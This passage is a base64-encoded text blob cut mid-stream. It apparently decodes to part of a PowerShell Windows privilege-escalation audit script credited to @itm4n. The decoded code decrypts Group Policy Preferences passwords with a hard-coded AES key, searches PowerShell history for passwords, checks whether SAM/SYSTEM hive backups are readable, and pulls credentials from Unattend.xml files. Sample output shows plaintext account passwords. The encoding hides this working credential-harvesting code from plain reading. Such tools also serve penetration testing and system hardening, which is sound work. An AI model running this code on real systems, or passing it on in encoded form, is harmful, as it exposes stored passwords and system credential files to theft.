E1pY3Jvc29mdFxHcm91cCBQb2xpY3lcSGlzdG9yeVx7NjZFMTE2MjItMTVBNC00MEI3LTkzOEMtRkFENDNBRjFGNTcyfVxNYWNoaW5lXFByZWZlcmVuY2VzXFNlcnZpY2VzXFNlcnZpY2VzLnhtbAoKICAgIFR5cGUgICAgIDogU2NoZWR1bGVkIFRhc2sKICAgIFVzZXJOYW1lIDogRVZJTENPUlBcU3ZjQ3VzdG9tVGFzawogICAgUGFzc3dvcmQgOiBUNHNrTTRzdGVyCiAgICBDb250ZW50ICA6IEFwcDogQzpcd2luZG93c1xzeXN0ZW0zMlxjbWQuZXhlCiAgICBDaGFuZ2VkICA6IDIwMjAtMDItMDkgMTI6MjA6NTAKICAgIEZpbGVQYXRoIDogQzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0XEdyb3VwIFBvbGljeVxIaXN0b3J5XHs2RTk4MDVEQS00Q0ZDLTQ3QUMtQkZDNC0yMTZGRUQwOEQzOUV9XE1hY2hpbmVcUHJlZmVyZW5jZXNcU2NoZWR1bGVkVGFza3NcU2NoZWR1bGVkVGFza3MueG1sCgogICAgVHlwZSAgICAgOiBVc2VyL0dyb3VwCiAgICBVc2VyTmFtZSA6IExvY2FsQWRtaW4KICAgIFBhc3N3b3JkIDogJHVwZXIkZWN1cmVQNHNzCiAgICBDb250ZW50ICA6IERlc2NyaXB0aW9uOiBTdXBlciBzZWN1cmUgbG9jYWwgYWRtaW4gYWNjb3VudAogICAgQ2hhbmdlZCAgOiAyMDIwLTAyLTA5IDEyOjA5OjU5CiAgICBGaWxlUGF0aCA6IEM6XFByb2dyYW1EYXRhXE1pY3Jvc29mdFxHcm91cCBQb2xpY3lcSGlzdG9yeVx7OEI5NTgxNEEtMjNBMi00RkI3LThCQkEtNTM3NDVFQTFGMTFDfVxNYWNoaW5lXFByZWZlcmVuY2VzXEdyb3Vwc1xHcm91cHMueG1sCgogICAgLkxJTksKCiAgICBodHRwczovL2dpdGh1Yi5jb20vUG93ZXJTaGVsbE1hZmlhL1Bvd2VyU3Bsb2l0L2Jsb2IvbWFzdGVyL1ByaXZlc2MvUG93ZXJVcC5wczEKICAgIGh0dHBzOi8vYWRzZWN1cml0eS5vcmcvP3A9MjI4OAogICAgaHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvc2VjdXJpdHktdXBkYXRlcy9zZWN1cml0eWJ1bGxldGlucy8yMDE0L21zMTQtMDI1CiAgICBodHRwczovL3N1cHBvcnQubWljcm9zb2Z0LmNvbS9lbi11cy9oZWxwLzI5NjI0ODYvbXMxNC0wMjUtdnVsbmVyYWJpbGl0eS1pbi1ncm91cC1wb2xpY3ktcHJlZmVyZW5jZXMtY291bGQtYWxsb3ctZWxldmF0aQoKICAgICM+CgogICAgW0NtZGxldEJpbmRpbmcoKV0gcGFyYW0oCiAgICAgICAgW3N3aXRjaF0kUmVtb3RlCiAgICApCgogICAgdHJ5IHsKICAgICAgICBBZGQtVHlwZSAtQXNzZW1ibHkgU3lzdGVtLlNlY3VyaXR5CiAgICAgICAgQWRkLVR5cGUgLUFzc2VtYmx5IFN5c3RlbS5Db3JlCiAgICB9IGNhdGNoIHsKICAgICAgICAjIGRvIG5vdGhpbmcKICAgIH0KCiAgICBmdW5jdGlvbiBHZXQtRGVjcnlwdGVkUGFzc3dvcmQgewogICAgICAgIFtDbWRsZXRCaW5kaW5nKCldIHBhcmFtKAogICAgICAgICAgICBbc3RyaW5nXSAkQ3Bhc3N3b3JkIAogICAgICAgICkKCiAgICAgICAgaWYgKC1ub3QgW1N0cmluZ106OklzTnVsbE9yRW1wdHkoJENwYXNzd29yZCkpIHsKCiAgICAgICAgICAgICRNb2QgPSAkQ3Bhc3N3b3JkLkxlbmd0aCAlIDQKICAgICAgICAgICAgaWYgKCRNb2QgLWd0IDApIHsKICAgICAgICAgICAgICAgICRDcGFzc3dvcmQgKz0gIj0iICogKDQgLSAkTW9kKQogICAgICAgICAgICB9CgogICAgICAgICAgICAkQmFzZTY0RGVjb2RlZCA9IFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkQ3Bhc3N3b3JkKQoKICAgICAgICAgICAgdHJ5IHsKCiAgICAgICAgICAgICAgICAkQWVzT2JqZWN0ID0gTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkFlc0NyeXB0b1NlcnZpY2VQcm92aWRlcgogICAgICAgICAgICAgICAgW0J5dGVbXV0gJEFlc0tleSA9IEAoMHg0ZSwweDk5LDB4MDYsMHhlOCwweGZjLDB4YjYsMHg2YywweGM5LDB4ZmEsMHhmNCwweDkzLDB4MTAsMHg2MiwweDBmLDB4ZmUsMHhlOCwweGY0LDB4OTYsMHhlOCwweDA2LDB4Y2MsMHgwNSwweDc5LDB4OTAsMHgyMCwweDliLDB4MDksMHhhNCwweDMzLDB4YjYsMHg2YywweDFiKQoKICAgICAgICAgICAgICAgICRBZXNJViA9IE5ldy1PYmplY3QgQnl0ZVtdKCRBZXNPYmplY3QuSVYuTGVuZ3RoKSAKICAgICAgICAgICAgICAgICRBZXNPYmplY3QuSVYgPSAkQWVzSVYKICAgICAgICAgICAgICAgICRBZXNPYmplY3QuS2V5ID0gJEFlc0tleQogICAgICAgICAgICAgICAgJERlY3J5cHRvck9iamVjdCA9ICRBZXNPYmplY3QuQ3JlYXRlRGVjcnlwdG9yKCkgCiAgICAgICAgICAgICAgICBbQnl0ZVtdXSAkT3V0QmxvY2sgPSAkRGVjcnlwdG9yT2JqZWN0LlRyYW5zZm9ybUZpbmFsQmxvY2soJEJhc2U2NERlY29kZWQsIDAsICRCYXNlNjREZWNvZGVkLmxlbmd0aCkKCiAgICAgICAgICAgICAgICBbU3lzdGVtLlRleHQuVW5pY29kZUVuY29kaW5nXTo6VW5pY29kZS5HZXRTdHJpbmcoJE91dEJsb2NrKQoKICAgICAgICAgICAgfSBjYXRjaCBbRXhjZXB0aW9uXSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICRfLkV4Y2VwdGlvbi5NZXNzYWdlCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgaWYgKCRSZW1vdGUpIHsKICAgICAgICAkR3BwUGF0aCA9ICJcXCQoJEVudjpVU0VSRE5TRE9NQUlOKVxTWVNWT0wiCiAgICB9IGVsc2UgewogICAgICAgICRHcHBQYXRoID0gJEVudjpBTExVU0VSU1BST0ZJTEUKICAgICAgICBpZiAoJEdwcFBhdGggLW5vdG1hdGNoICJQcm9ncmFtRGF0YSIpIHsKICAgICAgICAgICAgJEdwcFBhdGggPSBKb2luLVBhdGggLVBhdGggJEdwcFBhdGggLUNoaWxkUGF0aCAiQXBwbGljYXRpb24gRGF0YSIKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkR3BwUGF0aCA9IEpvaW4tUGF0aCAtUGF0aCAkR3BwUGF0aCAtQ2hpbGRQYXRoICJNaWNyb3NvZnRcR3JvdXAgUG9saWN5IgogICAgICAgIH0KICAgIH0KICAgIAogICAgaWYgKFRlc3QtUGF0aCAtUGF0aCAkR3BwUGF0aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkgewoKICAgICAgICAkQ2FjaGVkR1BQRmlsZXMgPSBHZXQtQ2hpbGRJdGVtIC1QYXRoICRHcHBQYXRoIC1SZWN1cnNlIC1JbmNsdWRlICdHcm91cHMueG1sJywnU2VydmljZXMueG1sJywnU2NoZWR1bGVkdGFza3MueG1sJywnRGF0YVNvdXJjZXMueG1sJywnRHJpdmVzLnhtbCcsJ1ByaW50ZXJzLnhtbCcgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCgogICAgICAgIGZvcmVhY2ggKCRGaWxlIGluICRDYWNoZWRHUFBGaWxlcykgewogICAgICAgICAgICAKICAgICAgICAgICAgJEZpbGVGdWxsUGF0aCA9ICRGaWxlLkZ1bGxOYW1lIAogICAgICAgICAgICBXcml0ZS1WZXJib3NlICRGaWxlRnVsbFBhdGgKCiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBbeG1sXSRYbWxGaWxlID0gR2V0LUNvbnRlbnQgLVBhdGggJEZpbGVGdWxsUGF0aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAgICAgICB9IGNhdGNoIFtFeGNlcHRpb25dIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJF8uRXhjZXB0aW9uLk1lc3NhZ2UgCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmICgkTnVsbCAtZXEgJFhtbEZpbGUpIHsKICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICRYbWxGaWxlLkdldEVsZW1lbnRzQnlUYWdOYW1lKCJQcm9wZXJ0aWVzIikgfCBGb3JFYWNoLU9iamVjdCB7CgogICAgICAgICAgICAgICAgJFByb3BlcnRpZXMgPSAkXyAKICAgICAgICAgICAgICAgICRDcGFzc3dvcmQgPSAiIgoKICAgICAgICAgICAgICAgIHN3aXRjaCAoJEZpbGUuQmFzZU5hbWUpIHsKCiAgICAgICAgICAgICAgICAgICAgR3JvdXBzIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFR5cGUgPSAiVXNlci9Hcm91cCIKICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJOYW1lID0gJFByb3BlcnRpZXMudXNlck5hbWUgCiAgICAgICAgICAgICAgICAgICAgICAgICRDcGFzc3dvcmQgPSAkUHJvcGVydGllcy5jcGFzc3dvcmQgCiAgICAgICAgICAgICAgICAgICAgICAgICRDb250ZW50ID0gIkRlc2NyaXB0aW9uOiAkKCRQcm9wZXJ0aWVzLmRlc2NyaXB0aW9uKSIKICAgICAgICAgICAgICAgICAgICB9CiAgICAKICAgICAgICAgICAgICAgICAgICBTY2hlZHVsZWR0YXNrcyB7CiAgICAgICAgICAgICAgICAgICAgICAgICRUeXBlID0gIlNjaGVkdWxlZCBUYXNrIgogICAgICAgICAgICAgICAgICAgICAgICAkVXNlck5hbWUgPSAkUHJvcGVydGllcy5ydW5BcyAKICAgICAgICAgICAgICAgICAgICAgICAgJENwYXNzd29yZCA9ICRQcm9wZXJ0aWVzLmNwYXNzd29yZCAKICAgICAgICAgICAgICAgICAgICAgICAgJENvbnRlbnQgPSAiQXBwOiAkKCRQcm9wZXJ0aWVzLmFwcE5hbWUpICQoJFByb3BlcnRpZXMuYXJncykiCiAgICAgICAgICAgICAgICAgICAgfQogICAgCiAgICAgICAgICAgICAgICAgICAgRGF0YVNvdXJjZXMgewogICAgICAgICAgICAgICAgICAgICAgICAkVHlwZSA9ICJEYXRhIFNvdXJjZSIKICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJOYW1lID0gJFByb3BlcnRpZXMudXNlcm5hbWUgCiAgICAgICAgICAgICAgICAgICAgICAgICRDcGFzc3dvcmQgPSAkUHJvcGVydGllcy5jcGFzc3dvcmQgCiAgICAgICAgICAgICAgICAgICAgICAgICRDb250ZW50ID0gIkRTTjogJCgkUHJvcGVydGllcy5kc24pIgogICAgICAgICAgICAgICAgICAgIH0KICAgIAogICAgICAgICAgICAgICAgICAgIERyaXZlcyB7CiAgICAgICAgICAgICAgICAgICAgICAgICRUeXBlID0gIk1hcHBlZCBEcml2ZSIKICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJOYW1lID0gJFByb3BlcnRpZXMudXNlck5hbWUgCiAgICAgICAgICAgICAgICAgICAgICAgICRDcGFzc3dvcmQgPSAkUHJvcGVydGllcy5jcGFzc3dvcmQgCiAgICAgICAgICAgICAgICAgICAgICAgICRDb250ZW50ID0gIlBhdGg6ICQoJFByb3BlcnRpZXMucGF0aCkiCiAgICAgICAgICAgICAgICAgICAgfQogICAgCiAgICAgICAgICAgICAgICAgICAgU2VydmljZXMgewogICAgICAgICAgICAgICAgICAgICAgICAkVHlwZSA9ICJTZXJ2aWNlIgogICAgICAgICAgICAgICAgICAgICAgICAkVXNlck5hbWUgPSAkUHJvcGVydGllcy5hY2NvdW50TmFtZSAKICAgICAgICAgICAgICAgICAgICAgICAgJENwYXNzd29yZCA9ICRQcm9wZXJ0aWVzLmNwYXNzd29yZCAKICAgICAgICAgICAgICAgICAgICAgICAgJENvbnRlbnQgPSAiTmFtZTogJCgkUHJvcGVydGllcy5zZXJ2aWNlTmFtZSkiCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICBQcmludGVycyB7CiAgICAgICAgICAgICAgICAgICAgICAgICRUeXBlID0gIlByaW50ZXIiCiAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyTmFtZSA9ICRQcm9wZXJ0aWVzLnVzZXJuYW1lIAogICAgICAgICAgICAgICAgICAgICAgICAkQ3Bhc3N3b3JkID0gJFByb3BlcnRpZXMuY3Bhc3N3b3JkIAogICAgICAgICAgICAgICAgICAgICAgICAkQ29udGVudCA9ICJQYXRoOiAkKCRQcm9wZXJ0aWVzLnBhdGgpIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBpZiAoLW5vdCBbU3RyaW5nXTo6SXNOdWxsT3JFbXB0eSgkQ3Bhc3N3b3JkKSkgewogICAgICAgICAgICAgICAgICAgICRJdGVtID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAkSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlR5cGUiIC1WYWx1ZSAkVHlwZQogICAgICAgICAgICAgICAgICAgICRJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiVXNlck5hbWUiIC1WYWx1ZSAkVXNlck5hbWUKICAgICAgICAgICAgICAgICAgICAkSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlBhc3N3b3JkIiAtVmFsdWUgJChHZXQtRGVjcnlwdGVkUGFzc3dvcmQgLUNwYXNzd29yZCAkQ3Bhc3N3b3JkKQogICAgICAgICAgICAgICAgICAgICRJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiQ29udGVudCIgLVZhbHVlICRDb250ZW50CiAgICAgICAgICAgICAgICAgICAgJEl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJDaGFuZ2VkIiAtVmFsdWUgJFByb3BlcnRpZXMuUGFyZW50Tm9kZS5jaGFuZ2VkCiAgICAgICAgICAgICAgICAgICAgJEl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJGaWxlUGF0aCIgLVZhbHVlICRGaWxlRnVsbFBhdGgKICAgICAgICAgICAgICAgICAgICAkSXRlbQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgpmdW5jdGlvbiBJbnZva2UtUG93ZXJTaGVsbEhpc3RvcnlDaGVjayB7CiAgICA8IwogICAgLlNZTk9QU0lTCgogICAgU2VhcmNoZXMgZm9yIGludGVyZXN0aW5nIGtleXdvcmRzIGluIHRoZSBQb3dlclNoZWxsIGhpc3Rvcnkgb2YgdGhlIGN1cnJlbnQgdXNlci4KICAgIAogICAgLkRFU0NSSVBUSU9OCgogICAgUG93ZXJTaGVsbCBjb21tYW5kcyBhcmUgc2F2ZWQgaW4gYSBmaWxlIChDb25zb2xlSG9zdF9oaXN0b3J5LnR4dCksIGluIGEgc3ViZGlyZWN0b3J5IG9mIHRoZSAKICAgIGN1cnJlbnQgdXNlcidzIEFwcERhdGEgZm9sZGVyLiBUaGlzIHNjcmlwdCBleHRyYWN0cyB0aGUgY29udGVudCBvZiB0aGlzIGZpbGUgYW5kIGFsc28gY2hlY2tzIAogICAgd2hldGhlciBpdCBjb250YWlucyBzb21lIGtleXdvcmRzIHN1Y2ggYXMgInBhc3N3b3JkIi4KICAgIAogICAgLkVYQU1QTEUKCiAgICBQUyBDOlw+IEludm9rZS1Qb3dlclNoZWxsSGlzdG9yeUNoZWNrCgogICAgUGF0aCAgICAgICAgICA6IEM6XFVzZXJzXGxhYi11c2VyXEFwcERhdGFcUm9hbWluZ1xNaWNyb3NvZnRcV2luZG93c1xQb3dlclNoZWxsXFBTUmVhZExpbmVcQ29uc29sZUhvc3RfaGlzdG9yeS50eHQKICAgIENyZWF0aW9uVGltZSAgOiAxMS8xMS8yMDE5IDExOjAxOjU1CiAgICBMYXN0V3JpdGVUaW1lIDogMDQvMTAvMjAyMCAyMjo0MDozMAogICAgTGluZXMgICAgICAgICA6IDYzNAogICAgTWF0Y2hlcyAgICAgICA6IDEyCiAgICAKICAgICM+CgogICAgJEhpc3RvcnlGaWxlUGF0aCA9ICIkZW52OkFQUERBVEFcTWljcm9zb2Z0XFdpbmRvd3NcUG93ZXJTaGVsbFxQU1JlYWRMaW5lXENvbnNvbGVIb3N0X2hpc3RvcnkudHh0IgogICAgJEhpc3RvcnlGaWxlQ29udGVudCA9IEdldC1Db250ZW50IC1QYXRoICRIaXN0b3J5RmlsZVBhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgLUVycm9yVmFyaWFibGUgRXJyb3JHZXRDb250ZW50CgogICAgaWYgKC1ub3QgJEVycm9yR2V0Q29udGVudCkgewoKICAgICAgICAkSGlzdG9yeUNvdW50ID0gJEhpc3RvcnlGaWxlQ29udGVudC5Db3VudAogICAgICAgICRBbGxNYXRjaGVzID0gJEhpc3RvcnlGaWxlQ29udGVudCB8IFNlbGVjdC1TdHJpbmcgLVBhdHRlcm4gJEtleXdvcmRzT2ZJbnRlcmVzdCAtQWxsTWF0Y2hlcwogICAgICAgICRBbGxNYXRjaGVzQ291bnQgPSAkQWxsTWF0Y2hlcy5Db3VudAogICAgICAgICRGaWxlSXRlbSA9IEdldC1JdGVtIC1QYXRoICRIaXN0b3J5RmlsZVBhdGgKCiAgICAgICAgJEl0ZW0gPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdAogICAgICAgICRJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiUGF0aCIgLVZhbHVlICRIaXN0b3J5RmlsZVBhdGgKICAgICAgICAkSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIkNyZWF0aW9uVGltZSIgLVZhbHVlICRGaWxlSXRlbS5DcmVhdGlvblRpbWUKICAgICAgICAkSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIkxhc3RXcml0ZVRpbWUiIC1WYWx1ZSAkRmlsZUl0ZW0uTGFzdFdyaXRlVGltZQogICAgICAgICRJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiTGluZXMiIC1WYWx1ZSAkSGlzdG9yeUNvdW50CiAgICAgICAgJEl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJNYXRjaGVzIiAtVmFsdWUgJEFsbE1hdGNoZXNDb3VudAogICAgICAgICRJdGVtCiAgICB9Cn0KIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgRU5EIENSRURFTlRJQUxTICAgICAKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBCRUdJTiBTRU5TSVRJVkUgRklMRVMgCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpmdW5jdGlvbiBJbnZva2UtU2FtQmFja3VwRmlsZXNDaGVjayB7CiAgICA8IwogICAgLlNZTk9QU0lTCgogICAgQ2hlY2tzIGNvbW1vbiBsb2NhdGlvbnMgZm9yIHRoZSBTQU0vU1lTVEVNIGJhY2t1cCBmaWxlcyBhbmQgY2hlY2tzIHdoZXRoZXIgdGhlIGN1cnJlbnQKICAgIHVzZXIgY2FuIHJlYWQgdGhlbS4KCiAgICBBdXRob3I6IEBpdG00bgogICAgTGljZW5zZTogQlNEIDMtQ2xhdXNlCiAgICAKICAgIC5ERVNDUklQVElPTgoKICAgIFRoZSBTQU0vU1lTVEVNIHJlZ2lzdHJ5IGhpdmVzIGFyZSBzdG9yZWQgYXMgZmlsZXMgaW4gYSBrbm93biBsb2NhdGlvbjoKICAgICdDOlx3aW5kb3dzXFN5c3RlbTMyXGNvbmZpZycuIFRoZXNlIGZpbGVzIGFyZSBsb2NrZWQgYnkgZGVmYXVsdCBzbyBldmVuIFNZU1RFTSBjYW4ndCByZWFkIHRoZW0KICAgIHdoZW4gdGhlIHN5c3RlbSBpcyBydW5uaW5nLiBIb3dldmVyLCBjb3BpZXMgb2YgdGhlc2UgZmlsZXMgY2FuIGJlIGNyZWF0ZWQgaW4gb3RoZXIgZm9sZGVycyBzbwogICAgaXQncyB3b3J0aCBjaGVja2luZyBpZiB0aGVzZSBmaWxlcyBhcmUgYWNjZXNzaWJsZS4gCiAgICAKICAgICM+CiAgICAKICAgIFtDbWRsZXRCaW5kaW5nKCldIHBhcmFtKCkKCiAgICAkQXJyYXlPZlBhdGhzID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0IAogICAgW3ZvaWRdJEFycmF5T2ZQYXRocy5BZGQoJChKb2luLVBhdGggLVBhdGggJGVudjpTeXN0ZW1Sb290IC1DaGlsZFBhdGggInJlcGFpclxTQU0iKSkKICAgIFt2b2lkXSRBcnJheU9mUGF0aHMuQWRkKCQoSm9pbi1QYXRoIC1QYXRoICRlbnY6U3lzdGVtUm9vdCAtQ2hpbGRQYXRoICJTeXN0ZW0zMlxjb25maWdcUmVnQmFja1xTQU0iKSkKICAgIFt2b2lkXSRBcnJheU9mUGF0aHMuQWRkKCQoSm9pbi1QYXRoIC1QYXRoICRlbnY6U3lzdGVtUm9vdCAtQ2hpbGRQYXRoICJTeXN0ZW0zMlxjb25maWdcU0FNIikpCiAgICBbdm9pZF0kQXJyYXlPZlBhdGhzLkFkZCgkKEpvaW4tUGF0aCAtUGF0aCAkZW52OlN5c3RlbVJvb3QgLUNoaWxkUGF0aCAicmVwYWlyXHN5c3RlbSIpKQogICAgW3ZvaWRdJEFycmF5T2ZQYXRocy5BZGQoJChKb2luLVBhdGggLVBhdGggJGVudjpTeXN0ZW1Sb290IC1DaGlsZFBhdGggIlN5c3RlbTMyXGNvbmZpZ1xTWVNURU0iKSkKICAgIFt2b2lkXSRBcnJheU9mUGF0aHMuQWRkKCQoSm9pbi1QYXRoIC1QYXRoICRlbnY6U3lzdGVtUm9vdCAtQ2hpbGRQYXRoICJTeXN0ZW0zMlxjb25maWdcUmVnQmFja1xzeXN0ZW0iKSkKCiAgICBGb3JFYWNoICgkUGF0aCBpbiBbc3RyaW5nW11dJEFycmF5T2ZQYXRocykgewoKICAgICAgICBpZiAoVGVzdC1QYXRoIC1QYXRoICRQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKSB7IAoKICAgICAgICAgICAgR2V0LUNvbnRlbnQgLVBhdGggJFBhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgLUVycm9yVmFyaWFibGUgR2V0Q29udGVudEVycm9yIHwgT3V0LU51bGwgCgogICAgICAgICAgICBpZiAoLW5vdCAkR2V0Q29udGVudEVycm9yKSB7CiAgICAgICAgICAgICAgICAkU2FtQmFja3VwRmlsZSA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0IAogICAgICAgICAgICAgICAgJFNhbUJhY2t1cEZpbGUgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJQYXRoIiAtVmFsdWUgJFBhdGggCiAgICAgICAgICAgICAgICAkU2FtQmFja3VwRmlsZQogICAgICAgICAgICB9IAogICAgICAgIH0KICAgIH0KfQoKZnVuY3Rpb24gSW52b2tlLVVuYXR0ZW5kRmlsZXNDaGVjayB7CiAgICA8IwogICAgLlNZTk9QU0lTCgogICAgRW51bWVyYXRlcyBVbmF0dGVuZCBmaWxlcyBhbmQgZXh0cmFjdHMgY3JlZGVudGlhbHMgCgogICAgQXV0aG9yOiBAaXRtNG4KICAgIExpY2Vuc2U6IEJTRCAzLUNsYXVzZQogICAgCiAgICAuREVTQ1JJUFRJT04KCiAgICBTZWFyY2hlcyBjb21tb24gbG9jYXRpb25zIGZvciAiVW5hdHRlbmQueG1sIiBmaWxlcy4gV2hlbiBhIGZpbGUgaXMgZm91bmQsIGl0IGNhbGxzIHRoZSBjdXN0b20gCiAgICAiR2V0LVVuYXR0ZW5kU2Vuc2l0aXZlRGF0YSIgZnVuY3Rpb24gdG8gZXh0cmFjdCBjcmVkZW50aWFscyBmcm9tIGl0LiBOb3RlOiBjcmVkZW50aWFscyBhcmUgb25seQogICAgcmV0dXJuZWQgaWYgdGhlIHBhc3N3b3JkIGlzIG5vdCBlbXB0eSBhbmQgbm90IGVxdWFsIHRvICIqU0VOU0lUSVZFKkRBVEEqREVMRVRFRCoiLgogICAgCiAgICAuRVhBTVBMRQoKICAgIFBTIEM6XD4gSW52b2tlLVVuYXR0ZW5kRmlsZXNDaGVjayB8IGZsCgogICAgVHlwZSAgICAgOiBMb2NhbEFjY291bnQKICAgIERvbWFpbiAgIDogTi9BCiAgICBVc2VybmFtZSA6IEpvaG4KICAgIFBhc3N3b3JkIDogUGFzc3dvcmQxCiAgICBGaWxlICAgICA6IEM6XFdJTkRPV1NcUGFudGhlclxVbmF0dGVuZC54bWwKCiAgICAjPgoKICAgIFtDbWRsZXRCaW5kaW5nKCldIHBhcmFtKCkKCiAgICAkQXJyYXlPZlBhdGhzID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0IAogICAgW3ZvaWRdJEFycmF5T2ZQYXRocy5BZGQoJChKb2luLVBhdGggLVBhdGggJGVudjp3aW5kaXIgLUNoaWxkUGF0aCAiUGFudGhlclxVbmF0dGVuZGVkLnhtbCIpKQogICAgW3ZvaWRdJEFycmF5T2ZQYXRocy5BZGQoJChKb2luLVBhdGggLVBhdGggJGVudjp3aW5kaXIgLUNoaWxkUGF0aCAiUGFudGhlclxVbmF0dGVuZC54bWwiKSkKICAgIFt2b2lkXSRBcnJheU9mUGF0aHMuQWRkKCQoSm9pbi1QYXRoIC1QYXRoICRlbnY6d2luZGlyIC1DaGlsZFBhdGggIlBhbnRoZXJcVW5hdHRlbmRcVW5hdHRlbmRlZC54bWwiKSkKICAgIFt2b2lkXSRBcnJheU9mUGF0aHMuQWRkKCQoSm9pbi1QYXRoIC1QYXRoICRlbnY6d2luZGlyIC1DaGlsZFBhdGggIlBhbnRoZXJcVW5hdHRlbmRcVW5hdHRlbmQueG1sIikpCiAgICBbdm9pZF0kQXJyYXlPZlBhdGhzLkFkZCgkKEpvaW4tUGF0aCAtUGF0aCAkZW52OndpbmRpciAtQ2hpbGRQYXRoICJTeXN0ZW0zMlxTeXNwcmVwXFVuYXR0ZW5kLnhtbCIpKQogICAgW3ZvaWRdJEFycmF5T2ZQYXRocy5BZGQoJChKb2luLVBhdGggLVBhdGggJGVudjp3aW5kaXIgLUNoaWxkUGF0aCAiU3lzdGVtMzJcU3lzcHJlcFxQYW50aGVyXFVuYXR0ZW5kLnhtbCIpKQoKICAgIEZvckVhY2ggKCRQYXRoIGluIFtzdHJpbmdbXV0kQXJyYXlPZlBhdGhzKSB7CgogICAgICAgIGlmIChUZXN0LVBhdGggLVBhdGggJFBhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpIHsgCgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJGb3VuZCBmaWxlOiAkUGF0aCIKCiAgICAgICAgICAgICRSZXN1bHQgPSBHZXQtVW5hdHRlbmRTZW5zaXRpdmVEYXRhIC1QYXRoICRQYXRoIAogICAgICAgICAgICBpZiAoJFJlc3VsdCkgewogICAgICAgICAgICAgICAgJFJlc3VsdCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIkZpbGUiIC1WYWx1ZSAkUGF0aCAKICAgICAgICAgICAgICAgICRSZXN1bHQKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBFTkQgU0VOU0lUSVZFIEZJTEVTIAojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t